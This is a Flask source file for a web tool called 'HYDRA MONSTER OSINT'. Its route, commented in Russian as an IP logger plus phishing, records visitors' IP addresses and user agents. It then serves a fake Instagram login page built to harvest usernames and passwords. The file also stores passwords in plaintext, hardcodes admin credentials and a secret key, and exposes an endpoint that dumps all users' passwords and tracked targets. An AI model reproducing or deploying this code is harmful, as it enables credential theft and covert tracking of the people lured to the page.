from flask import Flask, request, jsonify, session, send_file, render_template_string
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from fpdf import FPDF
import requests
import os
import io
from datetime import datetime

app = Flask(__name__, static_folder='.')
app.secret_key = 'HYDRA_ULTRA_SECURE_2026'
CORS(app)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///hydra_users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)
    searches = db.relationship('SearchHistory', backref='owner', lazy=True)

class SearchHistory(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    target = db.Column(db.String(255))
    module = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def index(): return app.send_static_file('index.html')

# IP-ЛОГГЕР + ФИШИНГ
@app.route('/login/insta/<int:owner_id>')
def fake_insta(owner_id):
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    # Сразу пишем в историю, что кто-то перешел по ссылке
    log = SearchHistory(user_id=owner_id, target=f"VISIT: IP {ip} | DEV: {ua[:30]}", module="TRACKER")
    db.session.add(log); db.session.commit()
    return render_template_string('<body style="background:#fafafa;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px;"><div style="background:#fff;border:1px solid #dbdbdb;width:350px;padding:40px;text-align:center;"><img src="https://www.instagram.com/static/images/web/mobile_graph_gradient_android_2x.png/85392d20ad32.png" width="175"><form action="/login/auth/{{owner_id}}" method="POST" style="margin-top:20px;display:flex;flex-direction:column;"><input name="u" placeholder="Username" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;"><input name="p" type="password" placeholder="Password" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;"><button type="submit" style="background:#0095f6;color:#fff;border:none;padding:8px;border-radius:4px;font-weight:bold;cursor:pointer;">Log In</button></form></div></body>', owner_id=owner_id)

@app.route('/api/pdf', methods=['POST'])
def make_pdf():
    data = request.json
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", 'B', 16)
    pdf.cell(200, 10, "HYDRA MONSTER OSINT REPORT", 0, 1, 'C')
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}", 0, 1)
    pdf.cell(200, 10, f"Module: {data['module']}", 0, 1)
    pdf.cell(200, 10, f"Target: {data['target']}", 0, 1)
    pdf.multi_cell(0, 10, f"Result: {data['res']}")
    buf = io.BytesIO()
    pdf.output(dest='S').encode('latin-1')
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), download_name="report.pdf")

# Остальные методы (Login, Register, Admin, Scan) без изменений...
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('username'), data.get('password')
    user = User.query.filter_by(username=u, password=p).first()
    if user:
        session['user_id'] = user.id
        return jsonify({"status":"success", "uid": user.id, "isAdmin": (u=='abupaay' and p=='89674556975')})
    return jsonify({"status":"error"})

@app.route('/api/admin/users', methods=['GET'])
def get_users():
    u = User.query.get(session.get('user_id'))
    if u and u.username == 'abupaay':
        all_users = User.query.all()
        return jsonify([{"username": x.username, "password": x.password, "activity": [{"mod": s.module, "tar": s.target} for s in x.searches[-5:]]} for x in all_users])
    return jsonify([])

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
